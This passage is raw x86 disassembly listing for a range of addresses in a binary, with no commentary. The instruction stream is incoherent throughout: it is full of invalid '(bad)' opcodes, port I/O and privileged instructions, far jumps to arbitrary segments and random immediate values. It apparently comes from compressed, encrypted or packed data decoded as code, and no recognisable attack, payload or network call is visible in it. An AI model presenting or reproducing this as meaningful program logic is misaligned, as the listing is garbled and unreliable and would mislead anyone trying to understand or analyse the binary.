  40bbd8:	adc    bh,BYTE PTR ds:0x70df0442
  40bbde:	cmp    ebp,DWORD PTR [edi]
  40bbe0:	sbb    al,0xe6
  40bbe2:	in     al,dx
  40bbe3:	aas    
  40bbe4:	inc    esp
  40bbe5:	cmp    DWORD PTR [eax-0x580f197a],0xb65eaf86
  40bbef:	xchg   DWORD PTR [bx+di],ebx
  40bbf2:	ins    DWORD PTR es:[edi],dx
  40bbf3:	arpl   WORD PTR [esi],dx
  40bbf5:	push   eax
  40bbf6:	dec    eax
  40bbf7:	popa   
  40bbf8:	pop    esp
  40bbf9:	cli    
  40bbfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfb:	mov    WORD PTR [esi+0x39],cs
  40bbfe:	cmp    BYTE PTR [edi-0x3256e558],bl
  40bc04:	mov    ah,0x1
  40bc06:	jb     0x40bc5b
  40bc08:	and    al,0x11
  40bc0a:	cmp    al,0x62
  40bc0c:	out    0x93,al
  40bc0e:	dec    esi
  40bc0f:	fbstp  TBYTE PTR [esp+esi*1+0x7ad65573]
  40bc16:	xchg   DWORD PTR [eax+0x176c56a],esp
  40bc1c:	mov    dh,0xe
  40bc1e:	jnp    0x40bbee
  40bc20:	add    al,BYTE PTR [eax+0x32]
  40bc23:	push   edx
  40bc24:	jns    0x40bbbc
  40bc26:	aam    0x7
  40bc28:	nop
  40bc29:	fadd   DWORD PTR [edi+0x3aec8003]
  40bc2f:	mov    ecx,0x468a2cf7
  40bc34:	cmp    ebp,DWORD PTR [esi]
  40bc36:	iret   
  40bc37:	inc    ebx
  40bc38:	adc    ebp,esi
  40bc3a:	mov    DWORD PTR [ecx],0xe49a4764
  40bc40:	xor    eax,0x8ea508bc
  40bc45:	repnz std 
  40bc47:	dec    edi
  40bc48:	mov    al,cs:0xe0103a6a
  40bc4e:	jne    0x40bbe6
  40bc50:	add    BYTE PTR ds:0xb658c6af,al
  40bc56:	popf   
  40bc57:	jmp    0x4044:0x3dac7b5b
  40bc5e:	add    eax,0x23497975
  40bc63:	dec    edi
  40bc64:	ins    BYTE PTR es:[edi],dx
  40bc65:	cmp    dh,BYTE PTR [edx]
  40bc67:	xor    esi,0xffffff87
  40bc6a:	enter  0xcb8e,0x82
  40bc6e:	mov    edx,0x581322b0
  40bc73:	(bad)  
  40bc74:	jmp    0x5222be34
  40bc79:	sbb    al,0xff
  40bc7b:	aas    
  40bc7c:	ror    dl,1
  40bc7e:	stos   DWORD PTR es:[edi],eax
  40bc7f:	clc    
  40bc80:	fstp   QWORD PTR [ebp-0x53b2301a]
  40bc86:	and    bl,BYTE PTR [esp+ecx*2]
  40bc89:	gs stos DWORD PTR es:[edi],eax
  40bc8b:	xor    eax,0x3ee0aa28
  40bc90:	sbb    DWORD PTR [edi+ebx*1-0x1dd4d8a8],ecx
  40bc97:	and    esi,DWORD PTR [edi]
  40bc99:	leave  
  40bc9a:	xor    DWORD PTR [ebx-0x7595b04e],edi
  40bca0:	push   cs
  40bca1:	jo     0x40bc49
  40bca3:	mov    eax,0x871f419a
  40bca8:	push   edi
  40bca9:	std    
  40bcaa:	shl    BYTE PTR [edx],1
  40bcac:	push   edx
  40bcad:	sahf   
  40bcae:	inc    edi
  40bcaf:	xor    DWORD PTR [edx-0x5],ebp
  40bcb2:	les    edi,FWORD PTR [edi+0x9]
  40bcb5:	out    dx,al
  40bcb6:	inc    eax
  40bcb7:	sub    BYTE PTR [ebx],ch
  40bcb9:	adc    al,0x39
  40bcbb:	imul   eax,DWORD PTR [edx+0x53],0x8a6ddcfc
  40bcc2:	mov    esi,0x6b83170f
  40bcc7:	aaa    
  40bcc8:	dec    ebx
  40bcc9:	mov    esi,0xcc4168b6
  40bcce:	mov    dl,0x28
  40bcd0:	fmul   DWORD PTR [edx-0x21b9ec1d]
  40bcd6:	mov    es,WORD PTR [ebp+edi*1-0x49ad1e7d]
  40bcdd:	and    ebx,edx
  40bcdf:	pop    es
  40bce0:	test   BYTE PTR [esi+ecx*8],al
  40bce3:	jae    0x40bcfd
  40bce5:	cld    
  40bce6:	jle    0x40bc73
  40bce8:	cmc    
  40bce9:	cwde   
  40bcea:	in     eax,0x12
  40bcec:	sub    edx,esi
  40bcee:	fsubr  QWORD PTR [ebx+ecx*8-0x2880365c]
  40bcf5:	mov    edx,0x814a6b94
  40bcfa:	pop    esp
  40bcfb:	sbb    al,0xbf
  40bcfd:	mov    esp,0xa36c93cd
  40bd02:	ret    0x461f
  40bd05:	xor    ebx,DWORD PTR [eax+0x31d414a6]
  40bd0b:	inc    eax
  40bd0c:	push   edx
  40bd0d:	add    DWORD PTR [eax],0x53
  40bd10:	xchg   DWORD PTR [esp+eax*2-0x79],edx
  40bd14:	out    dx,al
  40bd15:	xchg   edx,eax
  40bd16:	je     0x40bd2c
  40bd18:	les    bp,DWORD PTR [ebx+0x6c71020a]
  40bd1f:	(bad)  
  40bd20:	(bad)  
  40bd21:	arpl   WORD PTR [esp+ebx*8-0x43f2f6fd],dx
  40bd28:	mov    edi,0x8558ba60
  40bd2d:	add    DWORD PTR [eax-0x6da52336],ecx
  40bd33:	xor    cl,BYTE PTR [esp+edi*8+0x326242a3]
  40bd3a:	(bad)  [edi+0x35]
  40bd3d:	push   ebp
  40bd3e:	sub    BYTE PTR [esi-0x1e],bl
  40bd41:	pushf  
  40bd42:	shl    DWORD PTR [eax+0x502f5bee],0xf8
  40bd49:	fistp  DWORD PTR [edx+0x3263de40]
  40bd4f:	pop    ebx
  40bd50:	or     BYTE PTR [ecx+0x670b71a6],al
  40bd56:	call   0x8ec5ac5
  40bd5b:	dec    edi
  40bd5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd5d:	xor    ebx,DWORD PTR [esi+0x74]
  40bd60:	or     al,0x31
  40bd62:	cmp    eax,0x92a84fc3
  40bd67:	leave  
  40bd68:	inc    edi
  40bd69:	aas    
  40bd6a:	bnd jp 0x40bd4d
  40bd6d:	push   eax
  40bd6e:	sub    eax,0x9f2cb0a4
  40bd73:	jno    0x40bd41
  40bd75:	je     0x40bcfb
  40bd77:	dec    edi
  40bd78:	sub    eax,0x7cfc961e
  40bd7d:	mov    ch,0xb8
  40bd7f:	xor    edx,DWORD PTR [edi]
  40bd81:	jl     0x40bd13
  40bd83:	bound  esi,QWORD PTR [esi+0x45c0824f]
  40bd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd8a:	jmp    0xed71:0x5ce2b62b
  40bd91:	mov    dl,0xb2
  40bd93:	shr    BYTE PTR [ebp+0x2a],cl
  40bd96:	xor    BYTE PTR [ebx+0x2],dh
  40bd99:	retf   0x1c2e
  40bd9c:	(bad)  
  40bd9d:	bound  ecx,QWORD PTR [edi+0x568a2f7d]
  40bda3:	adc    al,0x78
  40bda5:	lock outs dx,DWORD PTR ds:[esi]
  40bda7:	sahf   
  40bda8:	xor    dh,BYTE PTR [edi+ecx*2]
  40bdab:	pop    edi
  40bdac:	ins    DWORD PTR es:[edi],dx
  40bdad:	jg     0x40bd64
  40bdaf:	(bad)  
  40bdb1:	inc    eax
  40bdb2:	add    al,0x94
  40bdb4:	sub    dl,BYTE PTR [edi-0x50]
  40bdb7:	xor    eax,0x6022f1e5
  40bdbc:	sahf   
  40bdbd:	push   0x25
  40bdbf:	jb     0x40bd85
  40bdc1:	scas   eax,DWORD PTR es:[edi]
  40bdc2:	mov    esp,0x33ea69a7
  40bdc7:	mov    esp,0x70d8d932
  40bdcc:	dec    ch
  40bdce:	or     eax,0xa8c4e0d5
  40bdd3:	sbb    al,0x25
  40bdd5:	add    al,0x44
  40bdd7:	rcl    DWORD PTR [eax-0x17],0xdf
  40bddb:	sbb    esi,DWORD PTR [esi]
  40bddd:	and    al,cl
  40bddf:	aas    
  40bde0:	repnz push 0x934ad166
  40bde6:	fwait
  40bde7:	xchg   edx,eax
  40bde8:	stos   BYTE PTR es:[edi],al
  40bde9:	int3   
  40bdea:	ins    DWORD PTR es:[edi],dx
  40bdeb:	inc    ebx
  40bdec:	mov    ch,0x45
  40bdee:	pop    ecx
  40bdef:	cwde   
  40bdf0:	adc    BYTE PTR [edx+edx*2+0x18],dh
  40bdf4:	inc    edi
  40bdf5:	popf   
  40bdf6:	test   dl,dh
  40bdf8:	int    0x10
  40bdfa:	sbb    BYTE PTR [edi*1+0x184cdc89],dl
  40be01:	stos   BYTE PTR es:[edi],al
  40be02:	push   ss
  40be03:	sub    ch,BYTE PTR [ebp+0x5037f167]
  40be09:	inc    ecx
  40be0a:	jns    0x40bdcb
  40be0c:	fidivr WORD PTR [eax]
  40be0e:	pop    ecx
  40be0f:	int3   
  40be10:	pop    es
  40be11:	rcr    BYTE PTR [eax-0x22095b2],cl
  40be17:	in     eax,0x52
  40be19:	out    0x47,al
  40be1b:	mov    DWORD PTR [edi+0x5],esi
  40be1e:	cli    
  40be1f:	out    0x3e,eax
  40be21:	jle    0x40be01
  40be23:	adc    al,0xb7
  40be25:	ret    
  40be26:	sub    DWORD PTR [edi+0x71],edx
  40be29:	sbb    DWORD PTR [edi-0x77],ebp
  40be2c:	out    0x66,eax
  40be2e:	sub    DWORD PTR [edi],0x4963d211
  40be34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be35:	add    al,0xde
  40be37:	(bad)  
  40be38:	adc    bl,BYTE PTR [ebx+0x35]
  40be3b:	inc    esp
  40be3c:	sub    dh,ch
  40be3e:	(bad)  
  40be3f:	(bad)  
  40be40:	hlt    
  40be41:	ret    0xab46
  40be44:	and    eax,0x25d0faf6
  40be49:	cmp    ecx,DWORD PTR [edi+0x6d5f8794]
  40be4f:	jl     0x40be18
  40be51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be52:	pop    edi
  40be53:	add    dh,BYTE PTR [eax+edi*4]
  40be56:	es jb  0x40be7a
  40be59:	xor    esp,DWORD PTR [eax+0x66]
  40be5c:	and    DWORD PTR ds:0x94e3d0df,esp
  40be62:	xchg   ebp,eax
  40be63:	imul   esi,eax,0x62178fba
  40be69:	inc    ecx
  40be6a:	jecxz  0x40bee1
  40be6c:	jnp    0x40be60
  40be6e:	jbe    0x40be21
  40be70:	dec    esp
  40be71:	xchg   edi,eax
  40be72:	xchg   edi,eax
  40be73:	imul   BYTE PTR [eax+0x47]
  40be76:	cmc    
  40be77:	jnp    0x40bdfc
  40be79:	les    ebp,FWORD PTR [ebp+0x74a904f]
  40be7f:	inc    edx
  40be80:	mov    dh,0xa7
  40be82:	push   esi
  40be83:	cmp    DWORD PTR [esi+0x58],ebx
  40be86:	add    eax,0xc0f949e
  40be8b:	mov    ecx,0xe31bcbe4
  40be90:	bound  esp,QWORD PTR [ecx-0x22]
  40be93:	sbb    eax,0x4849e7b9
  40be98:	fsubr  QWORD PTR [edi+0x363e2184]
  40be9e:	fld    st(1)
  40bea0:	xchg   edx,eax
  40bea1:	xor    bh,al
  40bea3:	sahf   
  40bea4:	out    0x1,al
  40bea6:	or     eax,0xd214fd12
  40beab:	add    edx,DWORD PTR [edi]
  40bead:	or     al,BYTE PTR [esi]
  40beaf:	cmp    BYTE PTR [ecx],dh
  40beb1:	ror    DWORD PTR [eax],0xd
  40beb4:	jnp    0x40be9f
  40beb6:	xchg   ecx,eax
  40beb7:	mov    ch,0xa3
  40beb9:	mov    ecx,0xf8d84b3d
  40bebe:	pop    esp
  40bebf:	pop    ebx
  40bec0:	xchg   esi,eax
  40bec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec2:	fild   WORD PTR [esi-0x5b]
  40bec5:	sbb    al,0xf7
  40bec7:	dec    esi
  40bec8:	shl    dl,0x20
  40becb:	jo     0x40bf06
  40becd:	enter  0x2e9b,0x39
  40bed1:	out    0x85,al
  40bed3:	mov    ?,WORD PTR [edi]
  40bed5:	mov    ebp,0x4032ff5b
  40beda:	mov    al,0x1b
  40bedc:	int3   
  40bedd:	test   al,0xd3
  40bedf:	xor    eax,0xf0ffb6e9
  40bee4:	call   0xa0f0:0x11869dcd
  40beeb:	adc    eax,0x307cb716
  40bef0:	mov    ds:0xb718a266,al
  40bef5:	pop    edi
  40bef6:	popa   
  40bef7:	mov    dl,0xe9
  40bef9:	adc    esp,edx
  40befb:	mov    bl,0x7f
  40befd:	jb     0x40be95
  40beff:	fs scas eax,DWORD PTR es:[edi]
  40bf01:	sbb    bl,0xbf
  40bf04:	jo     0x40bf30
  40bf06:	push   ebx
  40bf07:	arpl   WORD PTR [edx+0x14934312],cx
  40bf0d:	add    eax,0x75fb7917
  40bf12:	jbe    0x40bf22
  40bf14:	(bad)  
  40bf15:	mov    edi,0xbfaaf18b
  40bf1a:	jp     0x40bf1e
  40bf1c:	lahf   
  40bf1d:	repnz push esp
  40bf1f:	adc    DWORD PTR ds:0xfea5a91b,eax
  40bf25:	scas   eax,DWORD PTR es:[edi]
  40bf26:	inc    eax
  40bf27:	in     eax,dx
  40bf28:	jp     0x40befe
  40bf2a:	rcr    DWORD PTR [ecx-0x20047835],0x8f
  40bf31:	fwait
  40bf32:	mov    si,0xd18d
  40bf36:	xor    al,0x76
  40bf38:	stc    
  40bf39:	mov    BYTE PTR [edx+0x30],ah
  40bf3c:	test   al,0x1f
  40bf3e:	cmp    BYTE PTR [esi+0x74a4c773],al
  40bf44:	jge    0x40bf8a
  40bf46:	inc    ebp
  40bf47:	imul   BYTE PTR [esi+ebp*4+0x4b3e1900]
  40bf4e:	mov    BYTE PTR [ebx-0x3b224b9e],ah
  40bf54:	sub    eax,DWORD PTR [ebx]
  40bf56:	int3   
  40bf57:	int3   
  40bf58:	pop    edi
  40bf59:	outs   dx,BYTE PTR ds:[esi]
  40bf5a:	pop    esi
  40bf5b:	xchg   esi,eax
  40bf5c:	inc    esp
  40bf5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf5e:	jmp    0x9a809901
  40bf63:	pop    ecx
  40bf64:	push   esp
  40bf65:	gs jb  0x40bfd0
  40bf68:	xchg   esi,eax
  40bf69:	cmp    DWORD PTR [esi-0x14],0x6d
  40bf6d:	(bad)  
  40bf6e:	cmp    bl,al
  40bf70:	add    BYTE PTR [ebx-0x7b78bf9b],ch
  40bf76:	cmp    DWORD PTR [eax+0xdee8a6a],ebp
  40bf7c:	cld    
  40bf7d:	push   0xa1c12ac7
  40bf82:	jnp    0x40bfbb
  40bf84:	sub    cl,ah
  40bf86:	rcr    eax,0x6b
  40bf89:	cmp    ah,BYTE PTR [ebx]
  40bf8b:	and    BYTE PTR ss:[eax-0x67],dh
  40bf8f:	stos   BYTE PTR es:[edi],al
  40bf90:	cdq    
  40bf91:	mov    bh,BYTE PTR [eax-0x7475cabc]
  40bf97:	repnz mov dh,0x9a
  40bf9a:	pop    ds
  40bf9b:	mov    dh,0xab
  40bf9d:	mov    ah,ch
  40bf9f:	adc    bh,cl
  40bfa1:	retf   
  40bfa2:	mov    ch,0xed
  40bfa4:	fwait
  40bfa5:	jecxz  0x40bfce
  40bfa7:	retf   
  40bfa8:	sub    ch,BYTE PTR [edi+ecx*8]
  40bfab:	push   ds
  40bfac:	out    0x4c,eax
  40bfae:	push   es
  40bfaf:	mov    al,ds:0xf3b144c4
  40bfb4:	cmp    bl,al
  40bfb6:	rol    bh,cl
  40bfb8:	fnstsw WORD PTR [esi+edi*8]
  40bfbb:	(bad)  
  40bfbc:	fdivr  QWORD PTR [ebp-0x6fc718bf]
  40bfc2:	sbb    al,cl
  40bfc4:	or     eax,0x93ef671b
  40bfc9:	and    ch,BYTE PTR [ebp-0x3d]
  40bfcc:	outs   dx,DWORD PTR ds:[esi]
  40bfcd:	retf   0x52ea
  40bfd0:	fsubp  st(3),st
  40bfd2:	jl     0x40bf75
  40bfd4:	mov    eax,ds:0xda5807d0
  40bfd9:	jbe    0x40bfe9
  40bfdb:	push   eax
  40bfdc:	inc    ebx
  40bfdd:	mov    bh,0x92
  40bfdf:	sub    DWORD PTR [edi],0xffffffdc
  40bfe2:	mov    ebx,0x58cb7655
  40bfe7:	cmc    
  40bfe8:	outs   dx,BYTE PTR ds:[esi]
  40bfe9:	mov    ecx,ecx
  40bfeb:	and    BYTE PTR [ebx-0x21],cl
  40bfee:	(bad)  
  40bfef:	push   esi
  40bff0:	inc    ebx
  40bff1:	ror    BYTE PTR [edx-0x7fee3e46],0x9e
  40bff8:	or     DWORD PTR [eax-0x12b4bf35],edx
  40bffe:	pop    DWORD PTR [ebx+0x1c267401]
  40c004:	mov    eax,DWORD PTR [edi]
  40c006:	mov    ecx,DWORD PTR [esp+ebx*1+0x6a]
  40c00a:	test   BYTE PTR [edx-0x2a],dh
  40c00d:	mov    bl,0xa1
  40c00f:	mov    ch,0xb0
  40c011:	pop    edx
  40c012:	cmp    eax,0xb7b2e41e
  40c017:	sub    edx,DWORD PTR [eax]
  40c019:	sar    BYTE PTR [ebx+0x8b80e42],1
  40c01f:	xor    BYTE PTR [ecx+0x56],ch
  40c022:	xor    edi,DWORD PTR [ecx+0x4c]
  40c025:	data16 test BYTE PTR [eax+ebp*1+0x24cd1311],bl
  40c02d:	in     al,0xd2
  40c02f:	aam    0xb
  40c031:	clc    
  40c032:	jo     0x40c01b
  40c034:	mov    eax,ds:0x90d98d66
  40c039:	jmp    0xe45fb906
  40c03e:	dec    edx
  40c03f:	push   ebx
  40c040:	stos   BYTE PTR es:[edi],al
  40c041:	mov    dh,0x54
  40c043:	and    eax,DWORD PTR [eax-0x28]
  40c046:	lahf   
  40c047:	cwde   
  40c048:	mov    esi,0x21448742
  40c04d:	pop    ecx
  40c04e:	in     eax,0x9d
  40c050:	push   edi
  40c051:	cmp    eax,0xf4fc16bf
  40c056:	int3   
  40c057:	inc    edi
  40c058:	std    
  40c059:	stos   BYTE PTR es:[edi],al
  40c05a:	mov    ebx,0x8f301250
  40c05f:	repz mov esi,0xea786cb4
  40c065:	fist   WORD PTR [eax]
  40c067:	(bad)  
  40c068:	mov    bl,0x80
  40c06a:	mov    edi,0x2512d361
  40c06f:	mov    al,ds:0x3fc9acf5
  40c074:	pop    ebp
  40c075:	loope  0x40c034
  40c077:	dec    esp
  40c078:	inc    ebx
  40c079:	loope  0x40c04c
  40c07b:	mov    ecx,0xefd4303e
  40c080:	push   es
  40c081:	sahf   
  40c082:	(bad)  [ebx]
  40c084:	ins    BYTE PTR es:[edi],dx
  40c085:	lods   al,BYTE PTR ds:[esi]
  40c086:	mov    DWORD PTR [edi+0x78],eax
  40c089:	xchg   edi,eax
  40c08a:	xchg   edx,eax
  40c08b:	jne    0x40c04a
  40c08d:	cmp    eax,0xe61efe7d
  40c092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c093:	add    ch,bh
  40c095:	test   bl,dh
  40c097:	stos   DWORD PTR es:[edi],eax
  40c098:	ss push edi
  40c09a:	not    DWORD PTR [edi+0x711c1b07]
  40c0a0:	or     BYTE PTR [ebp+0x273bf139],al
  40c0a6:	push   DWORD PTR [ebx]
  40c0a8:	mov    DWORD PTR [eax-0x14],esp
  40c0ab:	pop    ss
  40c0ac:	jg     0x40c0d7
  40c0ae:	lea    edx,[ecx+0x7e]
  40c0b1:	aad    0x48
  40c0b3:	aas    
  40c0b4:	sbb    ecx,DWORD PTR ds:0xd79c23ef
  40c0ba:	cmp    BYTE PTR [edi+0x77f8668e],dh
  40c0c0:	push   esi
  40c0c1:	adc    DWORD PTR [esi],ecx
  40c0c3:	jbe    0x40c067
  40c0c5:	add    DWORD PTR [ebx+eiz*4+0x32],edi
  40c0c9:	xchg   esp,eax
  40c0ca:	sbb    al,0x18
  40c0cc:	and    edi,esi
  40c0ce:	xchg   esp,eax
  40c0cf:	xor    DWORD PTR cs:[ebx-0x71],0x45
  40c0d4:	js     0x40c0ae
  40c0d6:	test   al,0xc
  40c0d8:	xchg   DWORD PTR [eax+0xf],edx
  40c0db:	jo     0x40c0af
  40c0dd:	imul   ecx,eax,0x59
  40c0e0:	jns    0x40c064
  40c0e2:	fs adc eax,0xa7242d2f
  40c0e8:	jmp    0x14f65d5f
  40c0ed:	cmp    DWORD PTR [esp+ebp*1-0x61],edi
  40c0f1:	cli    
  40c0f2:	jbe    0x40c136
  40c0f4:	dec    edi
  40c0f5:	scas   al,BYTE PTR es:[edi]
  40c0f6:	jnp    0x40c120
  40c0f8:	(bad)  
  40c0f9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0fb:	ret    
  40c0fc:	mov    esp,DWORD PTR [ecx]
  40c0fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0ff:	lds    ebx,FWORD PTR [ebp+0x66]
  40c102:	or     ebx,eax
  40c104:	pop    ebx
  40c105:	loope  0x40c177
  40c107:	xchg   ecx,eax
  40c108:	dec    ebx
  40c109:	retf   
  40c10a:	(bad)  
  40c10b:	jb     0x40c08d
  40c10d:	xchg   edx,eax
  40c10e:	fwait
  40c10f:	test   al,0xf1
  40c111:	retw   0x2c46
  40c115:	out    dx,al
  40c116:	xchg   edx,eax
  40c117:	push   eax
  40c118:	gs inc esp
  40c11a:	lahf   
  40c11b:	jp     0x40c0f4
  40c11d:	aam    0x24
  40c11f:	int3   
  40c120:	dec    esp
  40c121:	or     BYTE PTR [eax],0x98
  40c124:	xchg   esi,eax
  40c125:	jle    0x40c149
  40c127:	jnp    0x40c0dc
  40c129:	jne    0x40c19d
  40c12b:	outs   dx,DWORD PTR ds:[esi]
  40c12c:	and    eax,0x206455c1
  40c131:	push   ebp
  40c132:	inc    esp
  40c133:	add    al,0xce
  40c135:	gs (bad) 
  40c137:	pushf  
  40c138:	inc    edi
  40c139:	mov    al,0x77
  40c13b:	adc    ebx,DWORD PTR [edi+0x244eb440]
  40c141:	ret    0x3bab
  40c144:	in     al,dx
  40c145:	add    bh,BYTE PTR [esi-0x596c045c]
  40c14b:	pusha  
  40c14c:	cmc    
  40c14d:	adc    edi,esi
  40c14f:	ret    0x5c9
  40c152:	pop    ecx
  40c153:	std    
  40c154:	(bad)  
  40c155:	cmp    ebx,esp
  40c157:	rol    BYTE PTR [eax+0x51],1
  40c15a:	or     cl,bh
  40c15c:	int3   
  40c15d:	pop    edx
  40c15e:	adc    eax,0x8136ade
  40c163:	fnstenv [eax+0x22678a3e]
  40c169:	push   ebp
  40c16a:	mov    ds:0x8c9db96,al
  40c16f:	sub    ecx,eax
  40c171:	shl    DWORD PTR [ecx+0x2ec59f6],cl
  40c177:	sar    BYTE PTR [edi+0x22c36bfe],0xbc
  40c17e:	sub    eax,eax
  40c180:	push   ss
  40c181:	in     eax,0xa6
  40c183:	lock ret 0xce9b
  40c187:	in     eax,dx
  40c188:	lea    eax,[edx+0x2f]
  40c18b:	or     ebp,DWORD PTR [edx+0xc]
  40c18e:	sub    cl,0xa7
  40c191:	cli    
  40c192:	dec    edx
  40c193:	lock lea ebx,[edx+eax*8-0x6c4d36f4]
  40c19b:	int3   
  40c19c:	call   0x1f6a7b91
  40c1a1:	test   eax,0x93948baa
  40c1a6:	cmp    eax,0x8d40c081
  40c1ab:	stos   BYTE PTR es:[edi],al
  40c1ac:	mov    esp,0x1f24bc7
  40c1b1:	aam    0x98
  40c1b3:	pop    ds
  40c1b4:	ss fmul st(7),st
  40c1b7:	xchg   edi,eax
  40c1b8:	aam    0xff
  40c1ba:	adc    al,0xbd
  40c1bc:	xchg   ebx,eax
  40c1bd:	mov    DWORD PTR [ecx+0x3d5215cc],edx
  40c1c3:	jmp    0xa40b689d
  40c1c8:	(bad)  
  40c1c9:	mov    bh,al
  40c1cb:	(bad)  
  40c1cc:	xchg   ebx,eax
  40c1cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ce:	push   ebp
  40c1cf:	mov    BYTE PTR [edi],0xd0
  40c1d2:	pop    ebp
  40c1d3:	pushf  
  40c1d4:	ds push ecx
  40c1d6:	inc    esi
  40c1d7:	fwait
  40c1d8:	sbb    edi,esi
  40c1da:	xor    BYTE PTR [edx+eax*8],ah
  40c1dd:	jl     0x40c1f9
  40c1df:	inc    esi
  40c1e0:	aas    
  40c1e1:	shr    ch,1
  40c1e3:	push   eax
  40c1e4:	inc    edx
  40c1e5:	dec    esi
  40c1e6:	mov    edi,0xfb0f20cf
  40c1eb:	or     esi,ecx
  40c1ed:	inc    esi
  40c1ee:	repz pushf 
  40c1f0:	iret   
  40c1f1:	cmc    
  40c1f2:	push   es
  40c1f3:	aam    0x75
  40c1f5:	pop    edx
  40c1f6:	leave  
  40c1f7:	popa   
  40c1f8:	jg     0x40c1d4
  40c1fa:	push   ds
  40c1fb:	je     0x40c1f3
  40c1fd:	sub    al,0x22
  40c1ff:	jmp    0x40c1a5
  40c201:	xor    DWORD PTR [ebp-0x70d899d3],0xffffffe8
  40c208:	or     al,BYTE PTR [edi+esi*8]
  40c20b:	iret   
  40c20c:	loop   0x40c1b5
  40c20e:	mov    ecx,0x41e2fc05
  40c213:	cld    
  40c214:	aas    
  40c215:	push   ds
  40c216:	sub    ah,BYTE PTR [ebp+0x30]
  40c219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c21a:	loop   0x40c1db
  40c21c:	out    0x57,eax
  40c21e:	cmp    BYTE PTR [esi+0x6d77dbc3],bh
  40c224:	test   BYTE PTR ds:0xbd106fde,dl
  40c22a:	xlat   BYTE PTR ds:[ebx]
  40c22b:	shr    BYTE PTR [edx],1
  40c22d:	sar    BYTE PTR [ecx-0x72],1
  40c230:	mov    ds:0x7bd91205,al
  40c235:	push   esi
  40c236:	and    bl,BYTE PTR [ebx-0x31]
  40c239:	dec    ebx
  40c23a:	add    BYTE PTR [ebp+0x24],0x84
  40c23e:	je     0x40c290
  40c240:	add    esp,DWORD PTR [ebx]
  40c242:	lds    edi,FWORD PTR [ebp-0x1c]
  40c245:	test   al,0xc6
  40c247:	sub    eax,DWORD PTR [edx]
  40c249:	adc    eax,DWORD PTR [edi+0x1068b60f]
  40c24f:	adc    BYTE PTR [edx],ah
  40c251:	and    ebx,DWORD PTR [eax+edi*8+0x2e]
  40c255:	xchg   ebx,eax
  40c256:	mov    cl,BYTE PTR [ecx-0x49]
  40c259:	arpl   WORD PTR [eax-0x17],dx
  40c25c:	repnz mov DWORD PTR [eax-0x67],eax
  40c260:	jno    0x40c1f2
  40c262:	lods   al,BYTE PTR ds:[esi]
  40c263:	and    ecx,DWORD PTR [edx-0x7d3f84d8]
  40c269:	dec    edx
  40c26a:	repnz dec esi
  40c26c:	cdq    
  40c26d:	add    ecx,ebp
  40c26f:	mov    ch,0xb1
  40c271:	mov    WORD PTR [ecx+edx*2+0x51],fs
  40c275:	add    ah,BYTE PTR [esi-0x77b5849f]
  40c27b:	pop    ebp
  40c27c:	mov    ebp,0x70f0316b
  40c281:	mov    bh,0xff
  40c283:	in     al,0xe0
  40c285:	inc    ecx
  40c286:	dec    ebp
  40c287:	sti    
  40c288:	jmp    0x87f5852c
  40c28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c28e:	and    eax,0xc9f38f1a
  40c293:	mov    ah,0x43
  40c295:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c297:	or     eax,0x91b85e4c
  40c29c:	inc    esp
  40c29d:	out    0xa1,eax
  40c29f:	add    al,0x1b
  40c2a1:	mov    bl,0x40
  40c2a3:	dec    ecx
  40c2a4:	mov    esi,0x9c40b16a
  40c2a9:	cmp    BYTE PTR [edx],0xd1
  40c2ac:	out    dx,al
  40c2ad:	(bad)  
  40c2ae:	mov    dl,BYTE PTR [bx+0x28]
  40c2b2:	adc    ecx,DWORD PTR [edi]
  40c2b4:	mov    bl,0x71
  40c2b6:	and    DWORD PTR [ebx-0x685cbd07],ebx
  40c2bc:	fwait
  40c2bd:	ins    DWORD PTR es:[edi],dx
  40c2be:	push   0x3551ff12
  40c2c3:	cmc    
  40c2c4:	mov    DWORD PTR [eax-0x3ef7d556],ecx
  40c2ca:	adc    al,0x61
  40c2cc:	fsin   
  40c2ce:	pop    ecx
  40c2cf:	cmp    bh,bl
  40c2d1:	lahf   
  40c2d2:	cdq    
  40c2d3:	cdq    
  40c2d4:	mov    cl,0x4b
  40c2d6:	and    eax,0x29257c67
  40c2db:	xchg   BYTE PTR [esi-0x7a],dl
  40c2de:	xchg   edx,eax
  40c2df:	cmp    DWORD PTR [esi+0x61a8ac1c],edx
  40c2e5:	fsub   QWORD PTR [edx-0x15217406]
  40c2eb:	mov    ebx,0xf7258895
  40c2f0:	and    al,BYTE PTR [ecx+0x6f]
  40c2f3:	adc    cl,bh
  40c2f5:	cmp    eax,0x2a97535c
  40c2fa:	push   0x5d485586
  40c2ff:	add    eax,0xc8db9494
  40c304:	ss (bad) 
  40c306:	mov    edx,0xf4721e62
  40c30b:	dec    ecx
  40c30c:	dec    ecx
  40c30d:	sti    
  40c30e:	inc    edx
  40c30f:	fnstcw WORD PTR [ecx+0xd]
  40c312:	push   ds
  40c313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c314:	neg    DWORD PTR [esi]
  40c316:	(bad)  
  40c317:	lods   eax,DWORD PTR ds:[esi]
  40c318:	add    al,0xf8
  40c31a:	adc    esp,ebp
  40c31c:	sbb    ch,BYTE PTR [eax+0x23]
  40c31f:	dec    edi
  40c320:	xchg   esp,eax
  40c321:	push   es
  40c322:	daa    
  40c323:	cmp    dh,BYTE PTR [ecx-0x6a]
  40c326:	loope  0x40c31b
  40c328:	les    eax,FWORD PTR [ebx]
  40c32a:	adc    dl,BYTE PTR [edx-0x511d6ce6]
  40c330:	pop    ss
  40c331:	or     ebx,DWORD PTR [ebp+0x3f480b05]
  40c337:	inc    edx
  40c338:	push   ss
  40c339:	vpsubsb xmm2,xmm5,XMMWORD PTR [esi-0x1]
